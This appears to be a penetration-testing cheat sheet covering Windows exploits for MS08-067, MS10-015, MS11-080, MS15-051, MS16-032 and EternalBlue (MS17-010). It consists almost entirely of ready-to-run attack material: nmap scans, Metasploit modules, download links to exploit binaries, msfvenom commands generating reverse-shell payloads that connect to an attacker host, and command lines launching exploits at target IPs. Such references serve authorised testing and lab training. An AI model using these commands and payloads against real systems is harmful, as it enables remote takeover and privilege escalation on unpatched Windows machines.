## EoP - Common Vulnerabilities and Exposure

### MS08-067 (NETAPI)

Check the vulnerability with the following nmap script.

```
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
```

Metasploit modules to exploit `MS08-067 NetAPI`.

```
exploit/windows/smb/ms08_067_netapi
```

If you can’t use Metasploit and only want a reverse shell.

```
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
python ms08-067.py 10.0.0.1 6 445
```

### MS10-015 (KITRAP0D) - MICROSOFT WINDOWS NT/2000/2003/2008/XP/VISTA/7

‘KiTrap0D’ User Mode to Ring Escalation (MS10-015)

```
https://www.exploit-db.com/exploits/11199

Metasploit : exploit/windows/local/ms10_015_kitrap0d
```

### MS11-080 (AFD.SYS) - MICROSOFT WINDOWS XP/2003

```
Python: https://www.exploit-db.com/exploits/18176
Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
```

### MS15-051 (CLIENT COPY IMAGE) - MICROSOFT WINDOWS 2003/2008/7/8/2012

```
printf("[#] usage: ms15-051 command \n");
printf("[#] eg: ms15-051 \"whoami /all\" \n");

# x32
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe

# x64
https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
use exploit/windows/local/ms15_051_client_copy_image
```

### MS16-032 - MICROSOFT WINDOWS 7 < 10 / 2008 < 2012 R2 (X86/X64)

Check if the patch is installed : `wmic qfe list | findstr "3139914"`

```
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### MS17-010 (ETERNAL BLUE)

Check the vulnerability with the following nmap script.

```
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
```

Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.

```
auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

If you can’t use Metasploit and only want a reverse shell.

```
git clone https://github.com/helviojunior/MS17-010

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
python2 send_and_execute.py 10.0.0.1 revshell.exe
```